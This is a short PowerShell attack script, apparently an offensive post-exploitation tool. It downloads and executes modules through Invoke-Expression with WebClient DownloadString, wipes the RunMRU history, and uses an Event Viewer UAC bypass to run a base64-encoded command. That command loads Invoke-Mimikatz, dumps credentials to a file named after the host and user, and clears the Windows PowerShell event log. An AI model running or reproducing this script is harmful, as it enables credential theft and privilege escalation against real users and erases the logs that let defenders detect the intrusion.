$Path = Split-Path (Resolve-Path $MyInvocation.InvocationName).Path
$Directory = '\'
$Directory = Join-Path $Path $Directory

Invoke-Expression (New-Object Net.WebClient).DownloadString($($Directory + 'Clean-RunMRU.psm1'))
Clean-RunMRU -Last

$Command = "

	Invoke-Expression (New-Object Net.WebClient).DownloadString('$Directory' + 'Invoke-Mimikatz.psm1')
	`$Creds = Invoke-Mimikatz -DumpCreds
	`$LogName = 'Mimikatz Dump - ' + `$env:COMPUTERNAME + '_' + `$env:USERNAME
	Out-File -FilePath `$('$Directory' + `$LogName + '.txt') -InputObject `$Creds -Append -Force
	# Clear EventLog
	Clear-EventLog -LogName 'Windows PowerShell'
	"

Invoke-Expression (New-Object Net.WebClient).DownloadString($($Directory + 'Invoke-EventVwrBypass.psm1'))
Invoke-EventVwrBypass -Command ('Powershell -EncodedCommand ' + $([Convert]::ToBase64String($([System.Text.Encoding]::Unicode.GetBytes($Command))))) -Force